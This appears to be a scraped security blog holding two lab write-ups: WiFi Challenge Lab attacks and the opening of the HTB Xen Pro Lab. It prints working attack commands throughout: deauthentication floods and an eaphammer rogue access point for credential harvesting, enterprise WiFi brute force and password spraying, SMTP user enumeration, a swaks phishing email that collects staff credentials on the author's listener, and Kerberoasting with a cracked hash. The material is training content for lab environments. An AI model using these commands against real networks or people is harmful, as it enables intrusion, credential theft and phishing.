MFP (Management Frame Protection) is a wireless network feature designed to secure management frames from being tampered with or spoofed. When MFP is set to false (or disabled), the network becomes more vulnerable to certain types of wireless attacks.\nWhen MFP is False: Potential Vulnerabilities\nDeauthentication and Disassociation Attacks Attackers can send spoofed deauthentication or disassociation frames to disconnect clients from the network (e.g., using tools like aireplay-ng ). This is commonly used in Evil Twin attacks or to capture WPA handshakes for password cracking. Rogue Access Points and Evil Twin Attacks An attacker can set up a malicious AP that mimics the real one. Clients may be tricked into connecting to the rogue AP if MFP is not enforcing management frame integrity. Beacon Frame Spoofing Attackers can inject fake beacon frames to confuse clients, leading to denial-of-service (DoS) attacks or manipulation of the network. Channel Switching Attacks Attackers can send forged management frames to force clients to switch to a different channel, disrupting communication. Client Tracking Without MFP, management frames can be captured and analyzed to track connected devices\u0026rsquo; activity, leading to privacy issues. In our case with MFP disabled we can use this opportunity to create a rogue AP and perform a deauth attack in parallel in order to capture the password for the network when a client tries to log in to our rogue AP as shown below.\nWe can now crack the hashes to get the wifi password using hashcat. As we did in the challenge number 12 on PSK category.\nAfter we have our password we shall then create a config file that will allow us to login to the website to get the falg, for this section we can follow the previous challenge on how to use wpa_supplicant and dhclient to get an IP that we can use to access the wifi network for us to be able to access the website.\nRecon MGT # 15. What is the domain of the users of the wifi-regional network? # In management (MGT) networks, it\u0026rsquo;s possible for misconfigured users to send their identity (username) in plain text before the secure TLS tunnel is established. This can expose sensitive information. Using a tool like airodump-ng , we can passively capture this data without actively interfering with the network.\nHere’s how it works:\nYou simply run airodump-ng on the correct channel of the network and patiently wait for clients to connect. As users attempt to authenticate, their identity information might be visible in the captured packets if the network or client devices are misconfigured. This is a good example of why properly securing WPA2/WPA3 Enterprise networks is so important.\nHowever, we shall start first by identifying the channel of the wifi we are to connect to as shown below.\nIt is on channel 44, we can now try and capture traffic on the channel as we wait for a client to connect to the network. After we capture the traffic, as from the hint, we can use wifi_db to get the captured data from ariodump-ng in an arranged format that we can access from the database\nas shown below.\nThe syntax used for dispalying the data in sqlite is as follows python3 wifi_db.py -d wifi.sqlite /home/user/VICTOR/captures/psk/MGT here is the explanation of the command\npython3 wifi_db.py\nThis indicates that you\u0026rsquo;re running a Python script named wifi_db.py using Python 3. The script likely processes Wi-Fi-related data and interacts with a database.\nd wifi.sqlite\nThe -d option specifies the database file to use.\nwifi.sqlite is an SQLite database file, which is a lightweight, file-based database. The script will likely insert, query, or analyze data within this database. /home/user/VICTOR/captures/psk/MGT\nThis is the directory containing input data (e.g., capture files) for the script to process.\nThe folder /home/user/VICTOR/captures/psk/MGT likely contains capture files related to PSK (Pre-Shared Key) or MGT (Management) Wi-Fi networks. These files might include .cap, .pcap, or other formats used for Wi-Fi packet captures. 16. What is the email address of the servers certificate? # When establishing a TLS tunnel between an MGT network and a client, the access point (AP) sends its certificate to the client in plain text. This means that anyone monitoring the communication can see the certificate. While this might seem harmless, it can actually provide valuable information. For example, an attacker could use this certificate to create a fake version with the same fields, which can be used in a RogueAP attack. Additionally, the certificate might reveal details like the corporate domain, internal email addresses, or other relevant information about the AP or the organization.\nTo explore these certificates, we can use a tool like pcapFilter.sh, which helps display the certificates used by APs operating with MGT.\nThe syntax to run the script is as follows bash pcapFilter.sh -f '-02.cap' -C here is a breakdown of the command\npcapFilter.sh\nThis is the script being executed. It is a custom or third-party tool designed to process .cap files (packet captures) and filter specific information, such as certificates.\nf '-02.cap'\nThe f option specifies the input file for the script. -02.cap is the packet capture file containing network traffic data. C\nThis option tells the script to filter and display certificates. Certificates are often sent during the handshake process of networks using MGT or enterprise-level WPA protocols (e.g., WPA2-Enterprise). This data can provide insights into APs\u0026rsquo; configurations or help in crafting attacks like RogueAP or MITM.\n17. What is the EAP method supported by the wifi-global AP? # When testing the security of a network using EAP (Extensible Authentication Protocol), it\u0026rsquo;s important to understand what authentication methods the network\u0026rsquo;s AP (Access Point) supports. Once you\u0026rsquo;ve identified a valid user, you can probe the network by forcing different EAP authentication methods. This is where a tool like EAP_buster becomes valuable.\nbash ./EAP_buster.sh wifi-global 'GLOBAL\\GlobalAdmin' wlan\nbash ./EAP_buster.sh This runs a Bash script named EAP_buster.sh located in the current directory (./). The script is likely designed to test or exploit Extensible Authentication Protocol (EAP) configurations on Wi-Fi networks. wifi-global This is the SSID (Wi-Fi network name) of the target network. The script will perform its operations on this specific network. 'GLOBAL\\GlobalAdmin' This represents the identity or username being sent to the network during EAP authentication. The format DOMAIN\\User (e.g., GLOBAL\\GlobalAdmin) suggests the network is part of a corporate domain, and the user identity is tied to this domain. wlan1 This specifies the wireless interface to be used by the script. The interface wlan1 must be in monitor mode or capable of interacting with the target network. Below is how the output of the command looks like\nhowever, we could still identify the EAP method supported from hte database we got earlier\nMGT # 18. What is Juan\u0026rsquo;s flag on the wifi-corp AP website? # To target a misconfigured client on an MGT network, you can set up a Rogue Access Point (RogueAP) that mimics the legitimate network by using the same ESSID and configuration. This RogueAP should use a self-signed certificate, ideally replicating the details of the legitimate certificate to appear convincing if the client manually checks it. A tool like eaphammer can simplify this process.\npython3 ./eaphammer -i wlan3 --auth wpa-eap --essid wifi-corp --creds --negotiate balanced\npython3 ./eaphammer :\nThis runs the eaphammer script using Python 3. eaphammer is a tool designed to perform attacks on WPA-Enterprise networks, including setting up RogueAPs and credential harvesting.\ni wlan3 :\nSpecifies the wireless interface (wlan3) to be used for creating the RogueAP. Ensure this interface supports monitor mode and packet injection.\n-auth wpa-eap :\nIndicates the type of authentication used by the target network, in this case, WPA-Enterprise (WPA-EAP). This type of network uses protocols like PEAP or EAP-TLS for authentication.\n-essid wifi-corp :\nSets the ESSID (network name) for the RogueAP to wifi-corp, matching the name of the legitimate network. This is essential for deceiving clients into connecting to the RogueAP.\n-creds :\nEnables credential harvesting. The RogueAP will attempt to collect usernames and passwords or authentication tokens when a client connects and tries to authenticate.\n-negotiate balanced :\nThis sets the TLS negotiation strategy for the RogueAP to \u0026ldquo;balanced.\u0026rdquo; It aims to balance security and compatibility when negotiating the TLS handshake with clients. This approach helps to mimic a real access point more convincingly.\nUsing airodump-ng , we can identify the MAC addresses of the clients we want to target for a deauthentication attack. To ensure effectiveness, we execute this attack on both clients simultaneously. Since there are two access points (APs), the attack needs to target both of them. This is because disconnecting a client from one AP might cause it to reconnect to the other, rather than connecting to our Rogue Access Point (RogueAP).\nusing the commands\niwconfig wlan0mon channel 44 aireplay-ng -0 0 -a F0:9F:C2:71:22:1A wlan0mon -c 64:32:A8:07:6C:40 in another shell airmon-ng start wlan1 iwconfig wlan1mon channel 44 aireplay-ng -0 0 -a F0:9F:C2:71:22:15 wlan1mon -c 64:32:A8:07:6C:40 After performing a deauth attack on the client with address 64:32:A8:07:6C:40 using two different rogueAPs that we had setup, we were able to get the hash that we can crack t get the password as shown below.\nthe hash will be located in a logs directory under the eaphammer tool, where we can take it and get the hash alone using the syntax cat /root/tools/eaphammer/logs/hostapd-eaphammer.log | grep hashcat | awk '{print $3}' \u0026gt;\u0026gt; hashcat.5500\ncat /root/tools/eaphammer/logs/hostapd-eaphammer.log Reads and outputs the contents of the Eaphammer log file . | grep hashcat Filters the output, keeping only lines that contain the word \u0026ldquo;hashcat\u0026rdquo; (likely lines containing extracted WPA hashes). | awk '{print $3}' Extracts the third column ($3) from each matching line. This column probably contains the actual WPA hash . \u0026gt;\u0026gt; hashcat.5500 Appends (\u0026gt;\u0026gt;) the extracted hashes to a file named hashcat.5500 . If hashcat.5500 does not exist, it is created. after we get the hash, we can now crack it using hashcat as shown below\nroot@WiFiChallengeLab:~/VICTOR/captures# hashcat -a 0 -m 5500 hashcat.5500 ~/rockyou-top100000.txt --force after a while we have our password as shown below.\nGot stuck to access the website will look into it further later on.\n19. What is CONTOSO\\test flag on the wifi-corp AP website? # In this challenge, we already know the username, so we perform a brute force attack using the rockyou wordlist. To achieve this, we utilize a tool called air-hammer . It’s crucial to note that having the domain information is essential for this attack to work effectively. First we shall put our user in a text file and perform the bruteforce attack as shown below.\necho \u0026#39;CONTOSO\\test\u0026#39; \u0026gt; test.user ./air-hammer.py -i wlan3 -e wifi-corp -p ~/rockyou-top100000.txt -u test.user ./air-hammer.py :\nThis runs the air-hammer script, a tool used for performing brute-force attacks on WPA/WPA2 Enterprise networks.\ni wlan3 :\nSpecifies the wireless network interface to be used for the attack. In this case, wlan3 is the interface where the attack will be executed. Ensure this interface supports monitor mode.\ne wifi-corp :\nIndicates the target network\u0026rsquo;s ESSID (Extended Service Set Identifier), which is the name of the Wi-Fi network you\u0026rsquo;re attacking. Here, the target network is wifi-corp.\np ~/rockyou-top100000.txt :\nSpecifies the path to the password list file (wordlist) used for brute-forcing. In this case, it points to rockyou-top100000.txt, a subset of the popular rockyou wordlist containing the top 100,000 most common passwords.\nu test.user :\nProvides the username for the attack. Here, the username is test.user, which is necessary since the attack targets WPA/WPA2 Enterprise networks that rely on usernames and passwords for authentication.\nwith the password we have found we can now create a config file that we can use to connect to the network in order for us to access the webpage and get our flag.\nHere is the content of the config file\nnetwork={ ssid=\u0026#34;wifi-corp\u0026#34; scan_ssid=1 key_mgmt=WPA-EAP identity=\u0026#34;CONTOSO\\test\u0026#34; password=\u0026#34;PASSWORD\u0026#34; eap=PEAP phase1=\u0026#34;peaplabel=0\u0026#34; phase2=\u0026#34;auth=MSCHAPV2\u0026#34; } with that we are now provided with an IP address as shown below.\nafter accessing the webpage, I used the password and username of test to be able to get the flag.\n20. What is the flag for the user with pass 12345678 on the wifi-corp AP? # This challenge is similar to the previous one, however for this one we shall perform a password spray attack in order to get the user and get our flag. First we will have to customize our word-list as shown below then perform the password spray attack.\ncat ~/top-usernames-shortlist.txt | awk \u0026#39;{print \u0026#34;CONTOSO\\\\\u0026#34; $1}\u0026#39; \u0026gt; ~/top-usernames-shortlist-contoso.txt and now we shall perform the password spray attack\n./air-hammer.py -i wlan4 -e wifi-corp -P 12345678 -u ~/top-usernames-shortlist-contoso.txt\nwe found our user as shown below.\nthen edited our previous config file to use to access the website and we got our flag after logging to the website with the user’s credentials\n","date":"6 January 2025","externalUrl":null,"permalink":"/posts/wifi-hacking/","section":"Posts","summary":"Wireless Fidelity","title":"WIFI HaCKING","type":"posts"},{"content":"","date":"12 October 2024","externalUrl":null,"permalink":"/tags/htb/","section":"Tags","summary":"","title":"HTB","type":"tags"},{"content":"","date":"12 October 2024","externalUrl":null,"permalink":"/tags/intermediate/","section":"Tags","summary":"","title":"Intermediate","type":"tags"},{"content":"","date":"12 October 2024","externalUrl":null,"permalink":"/tags/mini-prolab/","section":"Tags","summary":"","title":"Mini-Prolab","type":"tags"},{"content":"","date":"12 October 2024","externalUrl":null,"permalink":"/categories/prolabs/","section":"Categories","summary":"","title":"Prolabs","type":"categories"},{"content":" Machine info # By egre55\nHumongous Retail operates a nationwide chain of stores. The company has reacted to several recent skimming incidents by investing heavily in their POS systems. Keen to avoid any further negative publicity, they have engaged the services of a penetration testing company to assess the security of their perimeter and internal infrastructure. Xen is designed to put your skills in enumeration, breakout, lateral movement, and privilege escalation to the test within a small Active Directory environment. The goal is to gain a foothold on the internal network, escalate privileges and ultimately compromise the domain while collecting several flags along the way. Entry Point: 10.13.38.12\nBreach # Enumeration # We shall start scanning our IP entry point for services that are currently open as shown below.\n┌──(n00b㉿v1c70r)-[~/HTB Prolabs/XEN] └─$ nmap -sCV -T4 -p- 10.13.38.12 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-12 07:45 EAT Nmap scan report for 10.13.38.12 Host is up (0.21s latency). Not shown: 65532 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 25/tcp open smtp | smtp-commands: CITRIX, SIZE 20480000, AUTH LOGIN, HELP |_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY | fingerprint-strings: | GenericLines, GetRequest: | 220 ESMTP MAIL Service ready (EXCHANGE.HTB.LOCAL) | sequence of commands | sequence of commands | Hello: | 220 ESMTP MAIL Service ready (EXCHANGE.HTB.LOCAL) | EHLO Invalid domain address. | Help: | 220 ESMTP MAIL Service ready (EXCHANGE.HTB.LOCAL) | DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY | NULL: |_ 220 ESMTP MAIL Service ready (EXCHANGE.HTB.LOCAL) 80/tcp open http Microsoft IIS httpd 7.5 |_http-server-header: Microsoft-IIS/7.5 |_http-title: Did not follow redirect to https://humongousretail.com/ 443/tcp open ssl/http Microsoft IIS httpd 7.5 |_http-server-header: Microsoft-IIS/7.5 | ssl-cert: Subject: commonName=humongousretail.com | Subject Alternative Name: DNS:humongousretail.com | Not valid before: 2019-03-31T21:05:35 |_Not valid after: 2039-03-31T21:15:35 |_http-title: Did not follow redirect to https://humongousretail.com/ | sslv2: | SSLv2 supported | ciphers: | SSL2_RC4_128_WITH_MD5 |_ SSL2_DES_192_EDE3_CBC_WITH_MD5 |_ssl-date: 2024-10-12T04:49:31+00:00; 0s from scanner time. 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port25-TCP:V=7.94SVN%I=7%D=10/12%Time=6709FFB6%P=x86_64-pc-linux-gnu%r( SF:NULL,33,\u0026#34;220\\x20ESMTP\\x20MAIL\\x20Service\\x20ready\\x20\\(EXCHANGE\\.HTB\\.L SF:OCAL\\)\\r\\n\u0026#34;)%r(Hello,55,\u0026#34;220\\x20ESMTP\\x20MAIL\\x20Service\\x20ready\\x20\\( SF:EXCHANGE\\.HTB\\.LOCAL\\)\\r\\n501\\x20EHLO\\x20Invalid\\x20domain\\x20address\\. SF:\\r\\n\u0026#34;)%r(Help,6F,\u0026#34;220\\x20ESMTP\\x20MAIL\\x20Service\\x20ready\\x20\\(EXCHANG SF:E\\.HTB\\.LOCAL\\)\\r\\n211\\x20DATA\\x20HELO\\x20EHLO\\x20MAIL\\x20NOOP\\x20QUIT\\ SF:x20RCPT\\x20RSET\\x20SAML\\x20TURN\\x20VRFY\\r\\n\u0026#34;)%r(GenericLines,6F,\u0026#34;220\\x2 SF:0ESMTP\\x20MAIL\\x20Service\\x20ready\\x20\\(EXCHANGE\\.HTB\\.LOCAL\\)\\r\\n503\\x SF:20Bad\\x20sequence\\x20of\\x20commands\\r\\n503\\x20Bad\\x20sequence\\x20of\\x20 SF:commands\\r\\n\u0026#34;)%r(GetRequest,6F,\u0026#34;220\\x20ESMTP\\x20MAIL\\x20Service\\x20read SF:y\\x20\\(EXCHANGE\\.HTB\\.LOCAL\\)\\r\\n503\\x20Bad\\x20sequence\\x20of\\x20comman SF:ds\\r\\n503\\x20Bad\\x20sequence\\x20of\\x20commands\\r\\n\u0026#34;); Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 271.81 seconds As seen above we ahve port 25 , 80 and 443 open. Furthermore, from the smtp service, we have a host-name identified EXCHANGE.HTB.LOCAL we will start by visiting the website at port 80 to see how it looks and enumerate it for vulnerabilities and hidden directories.\nAs seen above, when we visit the page 10.13.38.12:80 we are redirected to https://humongousretail.com/ which is on port 443 that we initially discovered when did our nmap scan on the host. I will add the host to our etc/hosts file in order to be able to access the site. The site was at first inaacessible from my machine so I had to change the security.tls.version.min to 1 as it only accepted tls versions of TLS 1.2 below is the guideline I used from chatgpt to change the version.\n2. Modify Firefox\u0026#39;s Security Settings: You can configure Firefox to allow older TLS versions. Here\u0026#39;s how: In the Firefox address bar, type: about:config and press Enter. Accept the warning message about changing advanced settings. Search for the preference security.tls.version.min. Change its value from 3 (which enforces TLS 1.2) to 1 (for TLS 1.0) or 2 (for TLS 1.1). Restart the browser and try accessing the site again. Here is how the site looks like.\nAt the very bottom of the page, there is join the team hyperlink that redirects to a mail client with the following email as the receiver of the email jointheteam@humongousretail.com ,\nnow we have one valid email, next we shall try and perform directory bruteforce to identify hidden directories.\nDirectory bruteforcing # ┌──(n00b㉿v1c70r)-[~/HTB Prolabs/XEN] └─$ gobuster dir -k -u https://humongousretail.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 30 =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: https://humongousretail.com [+] Method: GET [+] Threads: 30 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /images (Status: 301) [Size: 158] [--\u0026gt; https://humongousretail.com/images/] /Images (Status: 301) [Size: 158] [--\u0026gt; https://humongousretail.com/Images/] /css (Status: 301) [Size: 155] [--\u0026gt; https://humongousretail.com/css/] /js (Status: 301) [Size: 154] [--\u0026gt; https://humongousretail.com/js/] /remote (Status: 301) [Size: 158] [--\u0026gt; https://humongousretail.com/remote/] /IMAGES (Status: 301) [Size: 158] [--\u0026gt; https://humongousretail.com/IMAGES/] /CSS (Status: 301) [Size: 155] [--\u0026gt; https://humongousretail.com/CSS/] /JS (Status: 301) [Size: 154] [--\u0026gt; https://humongousretail.com/JS/] /jakarta (Status: 401) [Size: 1293] the -k flag is used to ignore ssl certificate verifications, however as seen above, we have two intersting directories identified, /remote and /jakarta\nabove are the two pages that we identified while brute forcing for directories.\nNext after identifying our pages, we can now try to poke around with the smtp service to be able and identify more emails.\nSMTP Service # We shall begin by enumerating the smtp service using smtp-user-enum tool which can easily be downloaded on linux using the command apt install smtp-user-enum\n┌──(n00b㉿v1c70r)-[~/HTB Prolabs/XEN] └─$ smtp-user-enum -U /usr/share/seclists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt -D humongousretail.com -t 10.13.38.12 -m 50 -M RCPT Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum ) Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum ) ---------------------------------------------------------- | Scan Information | ---------------------------------------------------------- Mode ..................... RCPT Worker Processes ......... 50 Usernames file ........... /usr/share/seclists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt Target count ............. 1 Username count ........... 26324 Target TCP port .......... 25 Query timeout ............ 5 secs Target domain ............ humongousretail.com ######## Scan started at Sat Oct 12 09:26:13 2024 ######### 10.13.38.12: it@humongousretail.com exists 10.13.38.12: legal@humongousretail.com exists 10.13.38.12: marketing@humongousretail.com exists 10.13.38.12: sales@humongousretail.com exists 10.13.38.12: SALES@humongousretail.com exists ######## Scan completed at Sat Oct 12 09:37:59 2024 ######### 5 results. 26324 queries in 706 seconds (37.3 queries / sec) zsh: unknown file attribute: From the command above -m flag is used to specify maximum number of processes, -M is used to specify method to use for username guessing, in our case we used to guess for recepients’ emails, -t flag is used to specify our target, -D is used to specify the domain we want to try our enumeration on, -U is used to specify a wordlist for usernames we want to test if they exist.\nAs seen above we have found 5 users, we can try and perform some phishing attacks to get if we can get creds of the users we found.\nCreds phishing # In this section we shall perform a phishing campaign using swaks tool,Swiss Army Knife SMTP, the all-purpose SMTP transaction tester, I will be using one email at a time to test for a user who will click our phishing email link. We shall set up a python server or even use netcat to listen on any interactions with our email nad perfrom a phish attack with swaks as shown below.\n┌──(n00b㉿v1c70r)-[~/HTB Prolabs/XEN] └─$ swaks --to sales@humongousretail.com --from it@humongousretail.com --header \u0026#34;Subject: Credentials / Errors\u0026#34; --body \u0026#34;citrix http://10.10.15.13/\u0026#34; --server humongousretail.com === Trying humongousretail.com:25... === Connected to humongousretail.com. \u0026lt;- 220 ESMTP MAIL Service ready (EXCHANGE.HTB.LOCAL) -\u0026gt; EHLO v1c70r \u0026lt;- 250-CITRIX \u0026lt;- 250-SIZE 20480000 \u0026lt;- 250-AUTH LOGIN \u0026lt;- 250 HELP -\u0026gt; MAIL FROM:\u0026lt;it@humongousretail.com\u0026gt; \u0026lt;- 250 OK -\u0026gt; RCPT TO:\u0026lt;sales@humongousretail.com\u0026gt; \u0026lt;- 250 OK -\u0026gt; DATA \u0026lt;- 354 OK, send. -\u0026gt; Date: Sat, 12 Oct 2024 09:52:22 +0300 -\u0026gt; To: sales@humongousretail.com -\u0026gt; From: it@humongousretail.com -\u0026gt; Subject: Credentials / Errors -\u0026gt; Message-Id: \u0026lt;20241012095222.079042@v1c70r\u0026gt; -\u0026gt; X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/ -\u0026gt; -\u0026gt; citrix http://10.10.15.13/ -\u0026gt; -\u0026gt; -\u0026gt; . \u0026lt;- 250 Queued (9.828 seconds) -\u0026gt; QUIT \u0026lt;- 221 goodbye === Connection closed with remote host. Above shows the output when we exxecute swaks --to [sales@humongousretail.com](mailto:sales@humongousretail.com) --from [it@humongousretail.com](mailto:it@humongousretail.com) --header \u0026quot;Subject: Credentials / Errors\u0026quot; --body \u0026quot;citrix [http://10.10.15.13/](http://10.10.15.13/)\u0026quot; --server [humongousretail.com](http://humongousretail.com/)\nbelow shows the output of our listener after we executed the phish attack using the same email three times, as I came to realise the citrix server can only be accessed with one person at a time\n┌──(n00b㉿v1c70r)-[~/HTB Prolabs/XEN] └─$ python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.13.38.12 - - [12/Oct/2024 09:50:21] code 501, message Unsupported method (\u0026#39;POST\u0026#39;) 10.13.38.12 - - [12/Oct/2024 09:50:21] \u0026#34;POST /remote/auth/login.aspx?LoginType=Explicit\u0026amp;user=jmendes\u0026amp;password=VivaBARC3L0N@!!!\u0026amp;domain=HTB.LOCAL HTTP/1.1\u0026#34; 501 - 10.13.38.12 - - [12/Oct/2024 09:51:19] code 501, message Unsupported method (\u0026#39;POST\u0026#39;) 10.13.38.12 - - [12/Oct/2024 09:51:19] \u0026#34;POST /remote/auth/login.aspx?LoginType=Explicit\u0026amp;user=pmorgan\u0026amp;password=Summer1Summer!\u0026amp;domain=HTB.LOCAL HTTP/1.1\u0026#34; 501 - 10.13.38.12 - - [12/Oct/2024 09:52:16] code 501, message Unsupported method (\u0026#39;POST\u0026#39;) 10.13.38.12 - - [12/Oct/2024 09:52:16] \u0026#34;POST /remote/auth/login.aspx?LoginType=Explicit\u0026amp;user=awardel\u0026amp;password=@M3m3ntoM0ri@\u0026amp;domain=HTB.LOCAL HTTP/1.1\u0026#34; 501 - 10.13.38.12 - - [12/Oct/2024 09:52:37] code 501, message Unsupported method (\u0026#39;POST\u0026#39;) jmendes / VivaBARC3L0N@!!! awardel / @M3m3ntoM0ri pmorgan / Summer1Summer! the page /remte required as to citrix to our machine, I downloaded the 64-bit tarball package from here and install with the following commands.\n┌──(n00b㉿v1c70r)-[~/HTB Prolabs/XEN] └─$ tar -xf linuxx64-13.10.0.20.tar.gz ┌──(n00b㉿v1c70r)-[~/HTB Prolabs/XEN] └─$ ls PkgId linuxx64-13.10.0.20.tar.gz pro_labs_V1C70Rn00b.ovpn linuxx64 nls setupwfc ┌──(n00b㉿v1c70r)-[~/HTB Prolabs/XEN] └─$ ./setupwfc Citrix Receiver for Linux 13.10.0 setup. Copyright 1996-2018 Citrix Systems, Inc. All rights reserved. Copyright (c) 1986-1997 RSA Security, Inc. All rights reserved. Citrix, Independent Computing Architecture (ICA), Program Neighborhood, MetaFrame, and MetaFrame XP are registered trademarks and Citrix Receiver, Citrix XenApp, XenDesktop, Citrix Presentation Server, Citrix Access Suite, and SpeedScreen are trademarks of Citrix Systems, Inc. in the United States and other countries. Microsoft, MS, MS-DOS, Outlook, Windows, Windows NT, and BackOffice are either registered trademarks or trademarks of Microsoft Corporation in the United States and other countries. All other Trade Names referred to are the Servicemark, Trademark, or Registered Trademark of the respective manufacturers. User install mode. Select a setup option: 1. Install Citrix Receiver for Linux 13.10.0 2. Remove Citrix Receiver for Linux 13.10.0 3. Quit Citrix Receiver for Linux 13.10.0 setup Enter option number 1-3 [1]: 1 Please enter the directory in which Citrix Receiver for Linux is to be installed. [default /home/n00b/ICAClient/linuxx64] or type \u0026#34;quit\u0026#34; to abandon the installation: The parent directory /home/n00b/ICAClient does not exist. Do you want to create it? [default y]: y You have chosen to install Citrix Receiver for Linux 13.10.0 in /home/n00b/ICAClient/linuxx64. Proceed with installation? [default n]: y Installation proceeding... Checking available disk space ... Disk space available 36231080 K Disk space required 51234 K Continuing ... Creating directory /home/n00b/ICAClient/linuxx64 Core package... Setting file permissions... Integrating with browsers... Integration complete. Do you want GStreamer to use the plugin from this client? [default y]: y USB support cannot be installed by non-root users. Run the installer as root to access this install option. Select a setup option: 1. Install Citrix Receiver for Linux 13.10.0 2. Remove Citrix Receiver for Linux 13.10.0 3. Quit Citrix Receiver for Linux 13.10.0 setup Enter option number 1-3 [3]: 3 Quitting Citrix Receiver for Linux 13.10.0 setup. With that installed, we can go back to our website /remote page and try to use one of the creds we found to login.\nI used pmorgan’s creds to login to the platform.\nand we got our flag when we visited the explorer.\nDeploy # After going through the workstation, I realized there is no windows defender or antivirus program on this machine, therefoe we can simply get a meterpreter session. It was a Windows 7 box so I gave a shot to local_exploit_suggester module of metasploit. As it suggested, you can easily elevate privileges with always_install_elevated module.\nGhost # At this point, I’ve already owned 3 machines and started mapping the lab.\nArp entries gave me some idea about the other machines.\nMy IP address was 172.16.249.205 (with a NAT address of 10.13.38.15), and the other two Windows 7 machines had IPs of 172.16.249.204 (10.13.38.14) and 172.16.249.203 (10.13.38.13).\nFortunately, both the Citrix server and Domain Controller (DC) were resolved via DNS. The DC\u0026rsquo;s IP address was 172.16.249.200\ncitrix was 172.16.249.201 - 10.13.38.12(our entry point)\nI was left with the Netscaler at 172.16.249.202. Typically, UNIX systems have a TTL (Time to Live) of 64 when responding to pings. Knowing that Netscaler is based on FreeBSD, which also has a TTL of 64, this further supported my assumption.\nKerberoasting # After spending some time and enumeration I saw some of the users had SPNs.\nImport-Module .\\GetUserSPNs.ps1\nBelow I will try and get the hash using kerberoasting technique.\nImport-Module .\\Invoke-Kerberoast.ps1 Invoke-Kerberoast -OutputFormat Hashcat My first attempts to crack the hash failed. After trying a few wordlists, I tried applying some rule files, and it broke:\nhashcat -a 0 -m 13100 GetUserSPNs.out /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/dive.rule --force $krb5tgs$23$*mturner$HTB.LOCAL$MSSQLSvc/CITRIXTEST.HTB.LOCAL~1433*$2c25cd994272360eeee9720fcf70b88e$f42d18b44f7bf2e242285f39370da356c9784f4ec96123b5d47766caebb6f0dae5350b58df4cd2c53c2c6671b7d5d425937656e01670134ee858d21b1515121adb29ba6de2fabab4f3ff139369136d3772e11d34c4979a0b5c3f65ff9648b26621d915352fead31a93e2dd01f92f1d329aef924e5969159cde84b764e4b45d01f162a92b667080983ed636f7a154fe4e63255e3d50b33c0fb8b95f0cd70f1bea102c0affcb89ba987bd5a9316a9c3254c93fabf71e584f5eaa726f3a7922b97b47e2bb16f8fb0bb2e73293d3f664e4e85bd3c6b995d13e5df3a1406a9395f7b02777e27ccd433f0fc0d006740ab92d9c13d6f0e91083b764b233783fbe490de230ec13d1c1ab1c63ecfc0248e4bca5050f7706d17ee827caf8377dc70c9df35cb81901542778f7c56aedd7f6491fb1c4e5f47990b95d2999e8df1e884be2023c0289a00f8a68bb12767f85dd958c2b2ae97cd7a5599503b064d7a5074c4932d443a141421941ba4193c08337dc95632d4e88282a6e789925bd4709e00f91420c18e8b6ac0b1bf6798fa719dd863c52b00631c4eedeb9718710f6c14625dd9b4ed71b7a3c09e7c353d44f215f496f2bab37f220e4f60637d5331360e13dcc216d990d1ae80705a8ec053427ab179b5160cdc1b39a26c4700b69c66fd11b53b6e942d0abf54d96f61eb5715c4f58a1246fa86f4a232f36d6989d783909bc28bfd8b836d6250a9f1a5350046a004a452da54d7c48e73998e0a2b457dac1f5687c70441974a27391bb9e31ea4510de4c32ef76a4287ae4929da9ff77cd1c18df4bee33115f356e2df9cee980e38ee644b4f1b9a7da38df0c9bb37d6c9f9fc4d79f407f8919c6b8d9fcba2779f8b91231a8aca7ae7b82e20341f5e5ac29f601d1e112c082128cd8a7be031b2279460833d4b03c2d4018bd1be0ca7b6578933c9142e653e2a931ab56516de8f1fd66a46f6834aa15aa4e4213265011cf7911325a281694b1f5fe040c13d1cc076efa27657deac7661a0455e86f78d5473b63324a1a10247ace4c64a4f37f17c6c671e9a97d4559a1a432aeea2275d7ea803e255add1daae32105c0337da391486157adb645d2faf0a138f63b0a1d7d739d11cbb53013ababb1cbf8d11c71bc143abf200466288197a6714d76ca0e538c25c8563e00acaa020033e3800d0c46cffc164a7a7bdc7851edcc08971328a59f3830158b9146027ccbe4d41df15f5834eff7dded87c4fd40b9aaf287a0d1a8c06cf71c82981ae6832a04ec30499570fb5842416a3202521095d9f337d7bfb1805ba18b7bd50396:4install! Session..........: hashcat Status...........: Cracked Hash.Type........: Kerberos 5 TGS-REP etype 23 Hash.Target......: $krb5tgs$23$*mturner$HTB.LOCAL$MSSQLSvc/CITRIXTEST....d50396 Time.Started.....: Mon May 13 17:40:49 2019 (6 hours, 49 mins) Time.Estimated...: Tue May 14 00:30:34 2019 (0 secs) Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Guess.Mod........: Rules (/usr/share/hashcat/rules/dive.rule) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 348.1 kH/s (14.54ms) @ Accel:8 Loops:4 Thr:64 Vec:8 Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts Progress.........: 8733004800/1421327732110 (0.61%) Rejected.........: 0/8733004800 (0.00%) Restore.Point....: 87552/14344385 (0.61%) Restore.Sub.#1...: Salt:0 Amplifier:37644-37648 Iteration:0-4 Candidates.#1....: temperaas1ture -\u0026gt; hako03 Started: Mon May 13 17:40:36 2019 